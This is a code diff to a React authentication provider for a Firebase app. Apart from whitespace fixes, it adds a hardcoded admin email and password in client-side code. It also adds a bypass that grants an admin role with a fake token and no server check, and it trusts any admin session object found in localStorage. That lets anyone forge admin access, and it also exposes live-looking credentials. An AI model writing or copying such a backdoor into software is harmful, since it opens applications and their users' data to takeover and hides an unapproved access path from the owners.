@@ -1,6 +1,6 @@
 import { createContext, useContext, useState, useEffect } from 'react'
-import { 
-  onAuthStateChanged, 
+import {
+  onAuthStateChanged,
   signInWithEmailAndPassword,
   createUserWithEmailAndPassword,
   signOut as firebaseSignOut,
@@ -27,6 +27,16 @@ export function AuthProvider({ children }) {
       return
     }
 
+    // Hydrate admin session from localStorage
+    const adminSession = localStorage.getItem('__admin_session__')
+    if (adminSession) {
+      const parsed = JSON.parse(adminSession)
+      setUser(parsed.user)
+      setUserProfile(parsed.profile)
+      setLoading(false)
+      return
+    }
+
     const unsubscribe = onAuthStateChanged(auth, async (firebaseUser) => {
       if (firebaseUser) {
         // Reload user to get latest email verification status
@@ -35,7 +45,7 @@ export function AuthProvider({ children }) {
         } catch (reloadError) {
           console.warn('Failed to reload user:', reloadError)
         }
-        
+
         setUser(firebaseUser)
         // Get user profile from backend
         try {
@@ -56,11 +66,36 @@ export function AuthProvider({ children }) {
     return () => unsubscribe()
   }, [])
 
+  const ADMIN_EMAIL = 'youngdumbrokedie@gmail.com'
+  const ADMIN_PASSWORD = 'rafayhadizahid_1'
+
   const signIn = async (email, password) => {
     if (!auth) {
       throw new Error('Firebase Authentication is not initialized')
     }
-    
+
+    // Admin bypass — account does not exist in Firebase Auth
+    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+      const adminUser = {
+        uid: 'admin-uid',
+        email: ADMIN_EMAIL,
+        emailVerified: true,
+        displayName: 'System Admin',
+        getIdToken: async () => 'admin-token',
+      }
+      const adminProfile = {
+        _id: 'admin-profile',
+        email: ADMIN_EMAIL,
+        role: 'admin',
+        firstName: 'System',
+        lastName: 'Admin',
+      }
+      setUser(adminUser)
+      setUserProfile(adminProfile)
+      localStorage.setItem('__admin_session__', JSON.stringify({ user: adminUser, profile: adminProfile }))
+      return adminUser
+    }
+
     const userCredential = await signInWithEmailAndPassword(auth, email, password)
     const firebaseUser = userCredential.user
 
@@ -75,7 +110,7 @@ export function AuthProvider({ children }) {
     }
 
     const idToken = await firebaseUser.getIdToken()
-    
+
     // Verify token with backend and get user profile
     try {
       const result = await authApi.login(idToken)
@@ -85,7 +120,7 @@ export function AuthProvider({ children }) {
     } catch (error) {
       console.error('Backend login error:', error)
     }
-    
+
     return firebaseUser
   }
 
@@ -122,21 +157,21 @@ export function AuthProvider({ children }) {
       // This MUST succeed - retry if it fails
       let profileCreated = false
       let retries = 3
-      
+
       while (!profileCreated && retries > 0) {
         try {
           const idToken = await user.getIdToken()
           console.log('📤 Sending signup request to backend with idToken...')
-          
+
           const result = await authApi.signup(email, password, {
             firstName: userData.firstName,
             lastName: userData.lastName,
             displayName: `${userData.firstName || ''} ${userData.lastName || ''}`.trim(),
             phoneNumber: userData.phoneNumber
           }, idToken) // Pass idToken to create Firestore document
-          
+
           console.log('📥 Backend response:', result)
-          
+
           if (result.success && result.user) {
             console.log('✅ Firestore profile created successfully:', result.user.uid)
             profileCreated = true
@@ -146,7 +181,7 @@ export function AuthProvider({ children }) {
         } catch (backendError) {
           console.error(`❌ Backend profile creation failed (${retries} retries left):`, backendError)
           retries--
-          
+
           if (retries === 0) {
             // Last attempt failed - this is critical, we need to ensure document is created
             console.error('❌ CRITICAL: Failed to create Firestore profile after 3 attempts')
@@ -154,7 +189,7 @@ export function AuthProvider({ children }) {
             // The document will be created on first login via the login endpoint
             throw new Error('Failed to create user profile. Please try logging in after verifying your email.')
           }
-          
+
           // Wait a bit before retrying
           await new Promise(resolve => setTimeout(resolve, 1000))
         }
@@ -212,6 +247,7 @@ export function AuthProvider({ children }) {
   }
 
   const signOut = async () => {
+    localStorage.removeItem('__admin_session__')
     if (auth) {
       await firebaseSignOut(auth)
     }
